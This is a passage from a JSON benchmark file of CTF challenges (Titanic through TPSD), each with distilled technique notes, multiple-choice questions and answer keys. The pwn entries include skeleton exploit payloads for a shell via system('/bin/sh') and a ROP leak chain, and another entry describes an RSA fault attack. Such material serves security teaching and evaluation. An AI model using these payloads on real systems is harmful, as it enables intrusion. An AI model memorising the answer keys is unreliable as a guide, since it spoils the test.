        "question": [
            "In the context of elliptic curve cryptography, why is it important to choose a prime `p` where `p`, `2*p + 1` are both prime, and `p` has a specific bit length, such as 128 bits? - A. To ensure the elliptic curve operates over a large enough finite field for security. - B. To reduce the computational complexity of curve operations. - C. To increase the chances of creating a singular curve. - D. To allow easy decryption of messages without the private key.",
            "When solving a discrete logarithm problem in elliptic curve cryptography, why would forming a curve of the type `y^2 = x^3` by setting parameters `(a, b) = (p*(2*p+1), p*(2*p+1))` simplify the challenge? - A. Because it eliminates the need for complex point addition and doubling operations. - B. Because it reduces the curve to a line, making algebraic manipulation easier. - C. Because it transforms the discrete logarithm to a simple division operation in the modular field. - D. Because it ensures that all points on the curve have integer coordinates."
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "Titanic",
        "write_up": "dataset/raw/Titanic.md",
        "type": "This write-up corresponds to a PPC (cryptography) challenge.",
        "competition": [
            "ASIS/2020/Quals",
            "https://ctftime.org/event/964/tasks/"
        ],
        "score": 125,
        "max_score": 375,
        "difficulty": 0.3333333333333333,
        "knowledge": [
            "When dealing with challenges requiring the modification of a number to meet certain conditions, such as converting to a printable ASCII string, one strategy is to manipulate the least significant bytes based on the observation that altering higher-value bytes to lower or increase the overall number can lead to optimal solutions. In scenarios where only ASCII printable characters are considered valid, the lower bound can be represented by `0x09` (Tab character in ASCII) and the upper bound by `0x7e` (Tilde character in ASCII). These bounds are utilized to ensure that any adjustments made to the number result in a string of printable characters, facilitating a binary search-like approach in finding the nearest number that meets the challenge criteria.",
            "For challenges involving hashing, especially with constraints like utilizing words from a source (e.g., movie subtitles or scripts) and wrapping them with a prefix and suffix before hashing (MD5, in the scenario), an approach involves systematically iterating through each word, applying necessary transformations such as converting to lowercase, removing punctuation, or handling special cases like contracted words, and then hashing the transformed word to check against a given hash. This brute-force method is particularly effective when the hash algorithm is not resistant to pre-image attacks, and the dataset (list of words) is of manageable size. Employing regular expressions (regex) can enhance the cleaning/processing step by offering a more flexible way to strip unwanted characters from words before hashing.\n\nExample Payload for Point 1: Unable to provide a specific payload as it varies per task, but the idea involves adjusting the hex representation of a number, ensuring all bytes beyond a significant byte adhere to the `0x09` or `0x7e` bounds.\n\nExample Payload for Point 2:\n`if hashed == '9326ea0931baf5786cde7f280f965ebb': print('[*] Hash found!')`"
        ],
        "question": [
            "In the context of transforming numbers to printable ASCII strings for a cyber challenge, which ASCII hexadecimal values represent the lower and upper bounds for ensuring the converted bytes are printable? - A. `0x00` for lower and `0xff` for upper - B. `0x01` for lower and `0x7f` for upper - C. `0x20` for lower and `0x7e` for upper - D. `0x09` for lower and `0x7e` for upper",
            "When solving a challenge that involves finding a word from movie subtitles, converting it to lowercase, wrapping it with specific strings, and then comparing its MD5 hash against a given value, which step is crucial for ensuring the process captures variations like contracted words? - A. Converting all letters to uppercase before hashing - B. Reversing the string before applying MD5 hashing - C. Using regex to selectively remove punctuation before hashing - D. Increasing the hash computation speed by using GPU acceleration"
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Titu",
        "write_up": "dataset/raw/Titu.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 69,
        "max_score": 477,
        "difficulty": 0.14465408805031446,
        "knowledge": [
            "When solving cryptographic challenges that involve equations, if variables are intertwined in a complex equation and there's a big constant involved, try factoring the constant. This can significantly simplify the problem if the constant or a related term can be expressed as a product of smaller factors or even better, as a perfect square. This approach is particularly useful when the equation can be manipulated into a more recognizable or solvable form after understanding the structure of the constant.",
            "In challenges where the goal is to find specific values (such as a flag) that satisfy a given equation, and the equation can be transformed into a form involving perfect squares, consider using divisors of the square root of a key constant. This method involves identifying factors of a derived number (in this case, $4k$, where $k$ is a key constant) and systematically checking each divisor or a combination of divisors to find the solution. This is most useful when the equation can be factored into a form where the solutions can be directly related to the divisors of a key constant.\n\nExample of using `divisors(m)` function in Sage for such a scenario:\n\n```python\nm = prod([2, 2, 3, 11, 11, 19, 47, 71, 3449, 11953, 5485619, 2035395403834744453, 17258104558019725087, 1357459302115148222329561139218955500171643099])  # Derived from factoring a constant \nfor d in divisors(m):  \n   x = long_to_bytes(d - 1)  \n   if b'CCTF{' in x:  \n       print(x)    \n       y = (m // d) + 1   \n       print(long_to_bytes(y))\n```\n\nThis snippet is especially useful in contexts where a cryptographic challenge provides a complex equation with a solution tied to the properties of certain numbers derived from the problem statement."
        ],
        "question": [
            "When tasked with solving a complex cryptographic equation where the variable interplay results in a complicated scenario, and there's a significant constant $k$ involved, which strategy could drastically simplify the problem, especially if $k$ or a term related to it can be turned into a perfect square?  - A. Convert all variables into prime numbers and apply the Chinese Remainder Theorem. - B. Isolate each variable on one side of the equation and solve sequentially. - C. Factor the constant $k$ and look for a way to express the entire equation or a part of it as a product of smaller factors or as a perfect square. - D. Increase the complexity of the equation by introducing auxiliary variables. ",
            "In cryptographic challenges, particularly when the objective involves unveiling values (like a flag) that meet a specific equation, which has been reformulated to include perfect squares, what is a promising approach to identify these values, given that the equation allows for this reconfiguration?  - A. Encrypt each element of the equation with a different symmetric key. - B. Deploy a brute-force attack on all possible values of variables until the correct one is found. - C. Utilize the divisors of the square root of a significant constant from the equation, systematically examining each divisor or their combinations to discern the solution. - D. Apply a differential cryptanalysis to exploit potential weaknesses in the equation's structure. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Toast-clicker3",
        "write_up": "dataset/raw/Toast-clicker3.md",
        "type": "This write-up describes a Reverse challenge.",
        "competition": [
            "BSidesSF/2020",
            "https://ctftime.org/event/977/tasks/"
        ],
        "score": 96,
        "max_score": 493,
        "difficulty": 0.1947261663286004,
        "knowledge": [
            "When dealing with dynamic class loading in Android applications, specifically using `DexClassLoader`, it is important to retrieve and decompile the referenced DEX (Dalvik Executable) files to understand the functionality of dynamically loaded classes. This includes identifying methods and parameters that can be invoked to achieve a desired outcome, such as extracting flags in a CTF challenge. This knowledge is applicable in scenarios requiring the analysis of Android applications that leverage dynamic code loading as a mechanism to execute code stored outside the main application APK.",
            "In instances where an application downloads external resources or files, the URLs embedded within the application's code can be a direct source for obtaining these files. Extracting and analyzing the content of such files can be critical for understanding the application's behavior, reverse-engineering, or in a CTF context, solving challenges. This approach is universally applicable for scenarios where applications dynamically fetch and execute code or store external resources that are pivotal for the application's or challenge's completion."
        ],
        "question": [
            "When implementing dynamic class loading within an Android application using `DexClassLoader`, the developer initiates the process by specifying the Dex file's location, the optional optimized directory (null in this case), the parent class loader, and finally, loads the class. Given this context, which method signature correctly depicts how a Dex file is dynamically loaded to invoke a class method called `printThirdFlag` with two string parameters? - A. `getClass().getMethod(\"printThirdFlag\", String.class).invoke(null, \"param1\", \"param2\");` - B. `new DexClassLoader(\"path/to/file.dex\", null, null, getClassLoader()).loadClass(\"className\").newInstance().getMethod(\"methodName\", String.class).invoke(\"param1\", \"param2\");` - C. `new DexClassLoader(Uri.fromFile(new File(\"externalFilesDir\", \"fileName.dex\")).toString(), null, null, ClassLoader.getSystemClassLoader().getParent()).loadClass(\"className\").getMethod(\"methodName\", String.class, String.class).invoke(\"param1\", \"param2\");` - D. `new DexClassLoader(Uri.fromFile(new File(getExternalFilesDir(null), \"bacon-final.dex\")).toString(), null, null, ClassLoader.getSystemClassLoader().getParent()).loadClass(\"bacon.ToastDynamicFlag\").getMethod(\"printThirdFlag\", String.class, String.class).invoke(newInstance(), \"ijiijiiijjjjjijijijiiijjijjjji\", \"jjjiiiiijjjijijijjijiijji\");`",
            "When an Android application employs a `DownloadManager` to download files, particularly for downloading external resources like DEX files, the process involves creating a `Request` object with the URL of the file. Given this scenario, how is the download initiated for a `.dex` file specified by its URL, assuming all other setups (like file destination and network conditions) are correctly configured? - A. `new DownloadManager.Request(Uri.parse(\"file_url\")).enqueue(downloadmanager);` - B. `downloadmanager.enqueue(new Uri.Request(\"https://example.com/file.dex\"));` - C. `downloadmanager.enqueue(new Request(Uri.parse(\"https://storage.googleapis.com/path/to/file.dex\")));` - D. `DownloadManager.Request(Uri.fromFile(new File(\"https://example.com/file.dex\")).enqueue(downloadmanager);`"
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "token of hxp",
        "write_up": "dataset/raw/token of hxp.md",
        "type": "crypto",
        "competition": [
            "C3CTF/2019",
            "https://ctftime.org/event/825/tasks/"
        ],
        "score": 714,
        "max_score": 1000,
        "difficulty": 0.714,
        "knowledge": [
            "When dealing with USB device firmware in CTF challenges, pay attention to the setup of vendor-specific control requests (`bRequest` values) sent to the device. These requests can often be a key to understanding device-specific commands or actions, such as writing data to EEPROM or triggering certain functionalities. For example, in the context of HID devices, specific `bRequest` values might correspond to different types of data that the device expects, like a password or a nonce, or could even trigger an action like generating a token.",
            "If the firmware involves cryptographic operations such as HMAC-SHA1 for token generation, and details about the key and message are unclear, it may be beneficial to inspect the USB interaction closely, especially looking for requests that are not documented or captured in provided traffic, such as a missing `0xdd` request in this case. Understanding the handling of these requests can reveal essential aspects of the cryptographic process, like the composition of the key (potentially combining pieces of information found in EEPROM) and the message that triggers token generation.\n\nThese insights can be universally applicable to similar challenges involving USB device interactions and cryptographic processes within firmware analysis tasks."
        ],
        "question": [
            "In a CTF challenge focusing on analyzing USB device firmware, you encounter a scenario where a mysterious device sends two vendor-specific control requests with `bRequest` values `0xbb` and `0xaa`. If you wish to understand the device's behavior or potentially modify its operation, which action should you prioritize based on these requests? - A. Inspect the device's power consumption to deduce its activity. - B. Focus on dissecting the USB enumeration process to understand device class. - C. Pay close attention to the handling of these `bRequest` values in the firmware, since they are likely key to device-specific commands or actions. - D. Reconstruct the physical layer USB signals for deeper electrical analysis. ",
            "When analyzing firmware that involves generating a token using HMAC-SHA1, but the key and message details are not direct, you discover there might be an undocumented `bRequest` value (e.g., `0xdd`) not observed in the captured USB traffic. To understand how the key is composed and how the message triggers token generation, what is the most effective strategy? - A. Decompile the entire firmware looking for general-purpose functions without focusing on USB interactions. - B. Reverse engineer the device's bootloader code for potential clues unrelated to USB requests. - C. Avoid focusing on cryptographic functions and instead analyze peripheral initialization routines. - D. Investigate the firmware\u2019s handling of this specific `bRequest` and related USB interactions, as it could unveil procedures to compose the key from EEPROM data and how the challenges' message is used. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Tokyo",
        "write_up": "dataset/raw/Tokyo.md",
        "type": "The type of challenge for this write-up is **forensics**.",
        "competition": [
            "ASIS/2018/Quals",
            "https://ctftime.org/event/568/tasks/"
        ],
        "score": 260,
        "max_score": 500,
        "difficulty": 0.52,
        "knowledge": [
            "When dealing with unrecognized binary file formats, headers, and repetitive patterns could suggest a real-life file or database format. Investigation might involve matching characteristics (like headers starting with specific characters, the presence of repeated value patterns, or unusual file structures) against known formats or even searching for hints related to real-life software or systems (as hinted by \"Kyoto Cabinet\" in the challenge). This approach could lead to identifying the file type when conventional tools such as `file` or `binwalk` fail to recognize the format. This strategy is particularly effective when a CTF challenge simulates a real-world scenario involving obscure or less commonly used file types.",
            "In challenges involved with sorting or reorganizing data, where data appears unordered or nonsensical, there may be hidden relationships between different parts of a file. For instance, if a file contains sections with seemingly unrelated numeric values and sections with data elements (like characters), the numeric values could serve as references or keys determining the order of data elements. This is especially true in challenges mimicking database structures like key/value stores. Techniques to uncover these relationships might include analyzing value patterns, attempting to match data elements with their references, or manipulating the file using tools specific to the suspected format (such as `kchashmgr` for a Kyoto Cabinet database). The recovery of order or meaningful structure in the data could require extracting and correctly interpreting these key-value pairs, potentially involving brute force or educated guessing to reconstruct keys that have been deliberately obscured or removed.\n\nExample Payload to Sort Data:\n```bash\n$ kchashmgr set database_file key \"value\"\n```\nThis command example, when adjusted to the correct key and value based on the challenge's context, could be used to manipulate the data within the file based on understood or discovered key/value mechanics, facilitating the reorganization or sorting of data to extract hidden information or flags."
        ],
        "question": [
            "When conventional tools like `file` or `binwalk` fail to recognize a binary file's format, and the file begins with an unusual header such as KC, which next step could likely aid in identifying the file format? - A. Run a deep antivirus scan to ensure the file is not malware. - B. Immediately look for visual patterns in a hex editor without any further analysis. - C. Attempt to execute the file in a secure environment to determine its action. - D. Investigate the characteristics, like headers and value patterns, and compare them against known file or database formats, potentially searching for real-life software or systems related hints.",
            "In a situation where a file consists of sections with numeric values and other sections with unordered data elements, and the context suggests a database-like structure, which command could be most beneficial for reordering or sorting the data, assuming the database format revealed is Kyoto Cabinet? - A. `grep -r \"pattern\" database_file` - B. `kchashmgr set database_file key \"value\"` - C. `sed -i 's/old/new/g' database_file` - D. `awk '{print $1}' database_file`"
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Too low voltage",
        "write_up": "dataset/raw/Too low voltage.md",
        "type": "The type of challenge described in the write-up is a crypto challenge.",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 435,
        "max_score": 500,
        "difficulty": 0.87,
        "knowledge": [
            "When facing RSA challenges, specifically regarding RSA-CRT (Chinese Remainder Theorem) vulnerabilities, exploit conditions such as a server running under undervolted conditions to induce faults in signature generation. This scenario is ripe for fault attacks such as the Bellcore attack, where one can obtain both a valid and an invalid signature for the same message to factor the RSA modulus `N`. The process requires computing the Greatest Common Divisor (GCD) of the difference between the valid (`s`) and invalid (`s'`) signatures and `N`. If `GCD(s-s', N)` results in a value other than 1 or `N`, this value is one of the prime factors of `N`, which can lead to the discovery of the private key `d` by computing the modular inverse of `e` with respect to `\\(\\phi(N)\\)` where `\\(\\phi(N)\\)` is Euler's totient function of `N`.",
            "Implementing fault attacks in scenarios with controlled inputs (like signing a fixed message) can successfully expose vulnerabilities in cryptographic systems. Specifically, the process involves repeatedly requesting the server to sign a predetermined message, checking each signature against the public key for validity, and utilizing the moment a discrepancy is observed to apply the fault attack technique. The successful application of this method depends on distinguishing between normal and fault-induced output behavior, a distinction often enabled by external conditions such as power issues hinted at by the challenge scenario. \n\n**Note:** Since the knowledge extraction demands applicability across various scenarios without specific payloads or scripts, the above points encapsulate the core concepts without delving into script-specific details."
        ],
        "question": [
            "In an RSA-CRT fault attack like the Bellcore attack, when presented with a server experiencing undervolted conditions leading to faults in signature generation, what critical computation allows for factoring the RSA modulus \\(N\\)?  - A. Calculating the SHA-256 hash of the difference between the valid and invalid signatures. - B. Finding the Least Common Multiple (LCM) of the valid and invalid signatures. - C. Computing the Greatest Common Divisor (GCD) of the difference between the valid (`s`) and invalid (`s'`) signatures and \\(N\\). - D. Performing a modular exponentiation of the valid signature with the public exponent \\(e\\). ",
            "When conducting a fault attack on an RSA-CRT based system by requesting signatures for a preselected message, what is the primary objective when analyzing the signatures received from the server?  - A. To ensure all received signatures match the server's public key perfectly. - B. To collect as many valid signatures as possible without concerning oneself with any invalid signatures. - C. To identify at least one valid and one invalid signature for the same message, enabling the application of fault attack techniques. - D. To modify the server's public key based on the signatures gathered to facilitate message decryption without the need for fault attacks. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Too Secure",
        "write_up": "dataset/raw/Too Secure.md",
        "type": "crypto",
        "competition": [
            "CyBRICS/2020",
            "https://ctftime.org/event/1012/tasks/"
        ],
        "score": 237,
        "max_score": 500,
        "difficulty": 0.474,
        "knowledge": [
            "In cryptographic challenges involving commitment schemes, if you need to create a different pair of `selection, random` (i.e., `x, r`) that leads to the same commitment value, one approach is to leverage operations modulo a prime factor of `p-1` (where `p` is part of the scheme parameters) or modulo `p-1` itself. This exploitation is possible because \\(g^{x + a'\\cdot r} \\mod p\\) can be simplified by Euler's theorem if the exponent is taken modulo `p-1` or any of its prime factors. Thus, this allows for the calculation of a new `random` value that, combined with a new selection, produces the original commitment. \n\n    - Condition: This technique is applicable in scenarios where committing to a value involves operations of the form \\(g^x \\mod p\\) and revealing involves showing `x` and `r` such that the commitment can be verified without directly revealing `x`. It also requires \\(gcd(a', p-1) != 1\\) where `a'` can be a derivation from the scheme's calculations.",
            "When the greatest common divisor (gcd) between an element (`a_dash2` in the context) and `p-1` is not equal to 1, making the modular inverse computation infeasible directly within the modulo `p-1` space, the solution is to identify a large prime factor of `p-1` and perform operations in modulo this prime factor's space instead. This is effective because the modular inverse exists in the space of this prime factor, allowing for the manipulation of equations to solve for variables of interest, such as finding an alternative `r` value that satisfies the commitment equation. \n\n    - Payload sample: `r2 = ((x1 - x2 + a1 * r1) * gmpy2.invert(a2, q) % q)` where `x1`, `x2` are selections, `a1`, `a2` derived values from those selections, `r1` is the original random value, and `r2` is the new random value to be computed that, along with `x2`, forms a new valid pair producing the same commitment."
        ],
        "question": [
            "In the context of breaking a cryptographic commitment scheme, if one needs to craft a different pair (`x2, r2`) that results in the identical commitment value as the original pair (`x1, r1`), which principle should be leveraged according to Euler's theorem to simplify the expression and find a new valid `r2`? - A. Multiply the original `r1` by the modular inverse of `x2` modulo `p` - B. Apply operations modulo a prime factor of `p-1` or `p-1` itself to the exponent in \\(g^{x + a'\\cdot r} \\mod p\\) - C. Divide the original `x1` by the new `x2` without considering modulo operations - D. Utilize the Chinese Remainder Theorem to combine different modulus calculations",
            "When confronting a scenario where the greatest common divisor (gcd) between an element (`a_dash2`) and `p-1` does not equal 1 in a cryptographic setting, rendering the modular inverse computation unfeasible directly within `p-1` space, which approach allows for finding an alternative `r` value that satisfies the commitment equation? - A. Calculate the modular inverse of `a_dash2` directly in modulo `p-1` - B. Shift the calculation to use a smaller prime factor of `p-1` and perform operations in this new modulo space - C. Ignore the modular inverse and simply add `a_dash2` to `p-1` - D. Use a large prime factor of `p-1`, working in this prime's modulo space where the modular inverse exists, to solve for the new `r` value"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "tooooo",
        "write_up": "dataset/raw/tooooo.md",
        "type": "pwn",
        "competition": [
            "HITCON/2018",
            "https://ctftime.org/event/669/tasks/"
        ],
        "score": 310,
        "max_score": 500,
        "difficulty": 0.62,
        "knowledge": [
            "In ARM-based (aarch64) pwnable challenges, if you need to execute `/bin/sh` but direct exploitation methods like `one_gadget` fail due to corrupted registers or stack data, consider using a two-step pointer overwrite strategy. First, set the `x0` register to point to `/bin/sh` using a function like `getusershell()` which retrieves valid user shell paths. This method is specifically useful in scenarios where the stack or registers are not in a state suitable for immediate exploitation with `one_gadget`.",
            "After successfully setting `x0` to `/bin/sh`, overwrite another function pointer to the `system` call. This allows executing `/bin/sh` as the system function uses the value stored in `x0` as its argument, effectively granting shell access. This approach is particularly valuable when direct execution paths are blocked or when specific conditions in the challenge setup prevent straightforward exploitation.\n\nSample payload snippet for steps 1 and 2 (specific addresses and methods to achieve the overwrite will vary based on the challenge):\n```python\n# Assume `addr_getusershell` and `addr_system` are the addresses of getusershell and system functions respectively.\n# And `addr_first_pointer` and `addr_second_pointer` are the addresses where the two pointers to be overwritten are located.\n\npayload = b\"\"\npayload += b\"A\" * offset # Replace 'offset' with the correct offset value to reach the pointer location\npayload += p64(addr_getusershell) # Overwrite the first pointer to `getusershell`\npayload += p64(addr_system)       # Overwrite the second pointer to `system`\n```\nThis example assumes the use of a 64-bit little-endian architecture (aarch64) and that the variables `addr_getusershell`, `addr_system`, `addr_first_pointer`, `addr_second_pointer`, and `offset` are already defined based on the specifics of the challenge."
        ],
        "question": [
            "In an ARM-based (aarch64) exploit development scenario where direct methods like `one_gadget` are not viable due to corrupted stack or registers, which function call can be used to set the `x0` register to `\"/bin/sh\"` for subsequent execution of system commands? - A. `system(\"/bin/sh\")` - B. `execve(\"/bin/sh\", NULL, NULL)` - C. `getusershell()` - D. `getshell()` ",
            "After leveraging `getusershell()` to set `x0` to `\"/bin/sh\"` in an ARM-based (aarch64) exploit, which function should you overwrite the next function pointer with to achieve shell execution given the scenario provided? - A. `exec(\"/bin/sh\")` - B. `system()` - C. `execve(\"/bin/sh\", NULL, NULL)` - D. `execShell()` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "topology",
        "write_up": "dataset/raw/topology.md",
        "type": "This write-up describes a Reverse Engineering (rev) challenge.",
        "competition": [
            "zer0pts/2023",
            "https://ctftime.org/event/1972/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When reversing a challenge that involves complex arithmetic operations on input data, automation tools like `angr` can significantly simplify the process of identifying valid input data. This approach is beneficial in scenarios where the input data must satisfy multiple, potentially unique conditions determined by the logic embedded in the challenge. In such cases, manually solving for the input data might not be efficient or feasible. The process involves simulating the challenge's binary or execution logic with the tool and iteratively refining input to meet the challenge's success criteria. This can be particularly useful in challenges where the input must meet conditions checked by multiple separate functions or processes.",
            "In challenges involving message handling between a main process and worker processes, where the main process sends out data blocks to worker processes for validation, and success is determined by the number of specific responses received (e.g., a certain number of \"OK\" responses), a strategy can be employed to construct input data in segments that individually satisfy a subset of those worker processes. This segment-wise approach to constructing a valid input can be essential in scenarios involving distributed logic validation, where the entire input does not need to be globally valid but must satisfy localized conditions across segments. When implementing a solution, one might consider breaking down the input into manageable pieces and focusing on satisfying the conditions imposed on each piece by the corresponding handling functions."
        ],
        "question": [
            "When solving complex arithmetic operations on input data in a reversed engineering challenge, which of the following tools is most effective for efficiently identifying valid input data that satisfies multiple unique conditions? - A. IDA Pro - B. GDB - C. `angr` - D. Wireshark",
            "In a communication model where a main process sends out data blocks to worker processes for validation, and the validation success for an input segment depends on receiving a specific number of \"OK\" responses from the worker processes, what strategy is most effective for constructing the input data? - A. Sending identical data to all worker processes to ensure uniform responses - B. Constructing input data in segments designed to meet the localized validation conditions of a subset of worker processes - C. Consolidating responses from worker processes before sending out the first data block - D. Using a single validation condition across all worker processes to simplify the input construction process"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Tornado Warning",
        "write_up": "dataset/raw/Tornado Warning.md",
        "type": "The type of this CTF challenge is `forensics`.",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When encountering challenges that involve decoding signals or files, researching relevant encoding standards mentioned in the challenge description can lead to finding specific tools for decoding. In scenarios where Specific Area Message Encoding (SAME) is used, tools like `seatty` can be applied to decode `.wav` files encoded with SAME. This is applicable in challenges where the file format and encoding standard are known.",
            "In challenges involving error transmission or signal distortion, if multiple interpretations (or decodings) for a single signal are available, choosing unique values (those that appear differently in error-pattern) from among the possible options can reveal hidden messages or flags. This strategy is particularly useful in scenarios where errors are intentionally introduced to encode a message, and each position within the message yields more than one possible value."
        ],
        "question": [
            "When trying to decode a .wav file that is known to be encoded with Specific Area Message Encoding (SAME), which of the following tools would be the most appropriate to use? - A. Wireshark - B. seatty - C. Audacity - D. VLC Media Player",
            "In a scenario where three messages are obtained from a decoding tool and each position in the messages offers two ASCII characters\u2014one appearing once and the other twice\u2014how should you select characters to uncover a hidden message? - A. Choose the characters that appear twice at each position. - B. Randomly pick one of the ASCII characters at each position. - C. Choose the characters that appear once at each position. - D. Combine both characters from each position into new symbols."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "tour",
        "write_up": "dataset/raw/tour.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "LA/2023",
            "https://ctftime.org/event/1732/tasks/"
        ],
        "score": -1.0,
        "max_score": 497,
        "difficulty": -1,
        "knowledge": [
            "When solving binary reverse-engineering challenges that involve calculating paths or costs based on given conditions, the All Pairs Shortest Path (APSP) algorithm, such as Floyd-Warshall, can be applied to minimize the distances between all pairs of points in a graph. This technique is particularly useful in challenges where the objective involves finding an optimal path with constraints like total cost limits. After applying APSP, one can tackle the problem with algorithms designed for the Traveling Salesman Problem (TSP) to find a minimal cost path that meets the challenge's requirements.",
            "For solving the Traveling Salesman Problem, especially in cases where direct application of common TSP solutions does not give the correct result or when the challenge has unique constraints (such as allowing vertices to be repeated to lower the overall cost), writing a custom dynamic programming solution can be effective. The approach involves using memoization to store minimum costs associated with visiting a set of vertices, iterating over combinations of vertices to find the path that minimizes the total travel cost. \n\nSample code fragment for a dynamic programming approach to TSP:\n```python\nfrom collections import defaultdict\nfrom functools import combinations\n\ndef tsp(dists):\n    memo = defaultdict(int)  # visited set -> (min cost, last visited in set)\n    n = len(dists)\n\n    for i in range(n):\n        memo[frozenset([i])] = (0, i)\n\n    for size in range(2, n + 1):\n        for comb in combinations(dists.keys(), size):\n            mn = float('inf')\n            argmin = -1\n            for e in comb:\n                cc = frozenset(set(comb) - {e})\n                cost, last = memo[cc]\n                if cost + dists[last][e] < mn:\n                    mn = cost + dists[last][e]\n                    argmin = e\n            memo[frozenset(comb)] = (mn, argmin)\n    # Extract path from memoized data omitted for conciseness\n```\nThis approach can be adapted to different scenarios where TSP needs to be solved under specific constraints."
        ],
        "question": [
            "In a binary reverse-engineering challenge, when trying to find the minimum cost path in a scenario where you're given distances between every pair of points, which algorithm would be best suited to pre-process the graph to minimize the distances for all pairs of vertices? - A. Depth-First Search (DFS) - B. Bellman-Ford algorithm - C. Floyd-Warshall algorithm - D. Dijkstra's algorithm",
            "In a scenario where the direct application of common Traveling Salesman Problem (TSP) solutions does not yield the correct result, and the challenge allows for repeating vertices to lower the travel cost, which approach is most effective for finding an optimal path? - A. Using a Greedy algorithm for every vertex selection - B. Applying the Floyd-Warshall algorithm directly to solve TSP - C. Writing a custom dynamic programming solution with memoization - D. Solving the problem with a brute-force method, checking every possible path"
        ],
        "answer": [
            "C. Floyd-Warshall algorithm",
            "C. Writing a custom dynamic programming solution with memoization"
        ]
    },
    {
        "name": "Tourniquet",
        "write_up": "dataset/raw/Tourniquet.md",
        "type": "pwn",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 249,
        "max_score": 500,
        "difficulty": 0.498,
        "knowledge": [
            "When dealing with a binary that has Partial RELRO, no canary, NX enabled, and no PIE, it's possible to exploit buffer overflows by overwriting the least significant byte of the return pointer (or base pointer) to control the execution flow without knowing the full address of the stack, due to the way buffers are handled and the addresses are aligned. This is particularly effective when ASLR (Address Space Layout Randomization) makes it difficult to predict the exact addresses.",
            "In situations where direct control of the instruction pointer (RIP) or return address is challenging due to restrictions on the input size or stack randomization, crafting a payload that adjusts the base pointer (RBP) to redirect execution into a controlled stack area\u2014where a ROP (Return-Oriented Programming) chain is placed\u2014can be a viable exploitation strategy. Although it introduces an element of chance regarding the success of the exploit due to byte alignment and the need for the lower byte of addresses to be null, it allows for bypassing some ASLR protection mechanisms.\n   \nExample payload in context with ASLR set to 2, exploiting a binary with the mentioned protections:\n```python\nbuf  = b\"A\"*8  \nbuf += p64(pop_rdi_ret)  # Where `pop_rdi_ret` is the address of a `pop rdi; ret;` gadget.\nbuf += p64(elf.got.puts)  # GOT address of the puts function, for leaking.\nbuf += p64(elf.plt.puts)  # PLT address of puts, to perform the leak.\nbuf += p64(elf.sym._start)  # Address of the `_start` function for restarting the binary execution.  \nbuf += p64(elf.sym._start)  # Repeating for stack alignment.\nbuf += b\"B\"*0xf  # Padding to adjust for stack offset, aligning the payload correctly.\n```"
        ],
        "question": [
            "When exploiting a buffer overflow in a binary with Partial RELRO, no canary, NX enabled, and no PIE, which of the following is essential for successful exploitation given that ASLR is enabled and makes it difficult to predict exact addresses?  - A. Overwriting the entire return address with a known library function address - B. Fill the buffer with a unique pattern to create a crash for debugging - C. Overwriting the least significant byte of the return pointer to control execution flow - D. Injecting NOP sleds extensively to ensure the shellcode is hit ",
            "In a buffer overflow exploit against a binary where direct control of the instruction pointer (RIP) is challenging, what strategy adjusts the base pointer (RBP) to redirect execution into a controlled stack area for a ROP (Return-Oriented Programming) chain execution?  - A. Crafting a payload that fills the buffer with addresses of gadgets found in the binary - B. Employing a brute-force attack to guess the address of the stack and overwrite the RIP directly - C. Crafting a payload that overwrites the least significant byte of the RBP for execution redirection - D. Overflowing the buffer with a long string of 'A's to cause a segmentation fault for debugging purposes "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "TPSD",
        "write_up": "dataset/raw/TPSD.md",
        "type": "crypto",
        "competition": [
            "Crypto/2023",
            "https://ctftime.org/event/1857/tasks/"
        ],
        "score": 82,
        "max_score": 209,
        "difficulty": 0.3923444976076555,
        "knowledge": [
            "In challenges requiring solutions to Diophantine equations, especially when asked for integers \\(p\\), \\(q\\), and \\(r\\) that satisfy a specific condition like \\(p^3 + q^3 + r^3 = 1\\), generating values based on a mathematical formula can be an effective strategy. The provided example shows how to derive \\(p\\), \\(q\\), and \\(r\\) using a variable \\(b\\) and simple arithmetic operations. This approach is applicable in scenarios where one needs to find integers that satisfy a cubic equation, and at least one of these integers must be a prime number. A specific formulation for \\(p\\), \\(q\\), and \\(r\\) is as follows:\n   - \\(P = 9 \\times (b^4)\\)\n   - \\(Q = -3 \\times b - 9 \\times (b^4)\\)\n   - \\(R = 1 + 9 \\times (b^3)\\)",
            "When working with tasks that require at least one prime number within a set of generated numbers, utilizing a prime checking function (like `isprime` from the `sympy` library in Python) can streamline the identification of valid inputs. By incrementing through a calculated range of values for variable \\(b\\), based on the bit length range provided in the challenge, one can efficiently find a value of \\(b\\) that ensures \\(R\\) (in this case) is prime. This strategy narrows down the search space and ensures compliance with the prime number requirement for challenges with bit length constraints for the integers.\n   - Function to find a valid \\(b\\):\n```python\nfrom sympy import isprime\n\ndef find_b(l, r):  \n    l = round(((2**l+1)//9)**(1/3))  \n    r = round(((2**r+1)//9)**(1/3))  \n    for b_ in range(l, r):  \n        a = 9*(b_**3)+1  \n        if isprime(a):  \n            return b_\n```"
        ],
        "question": [
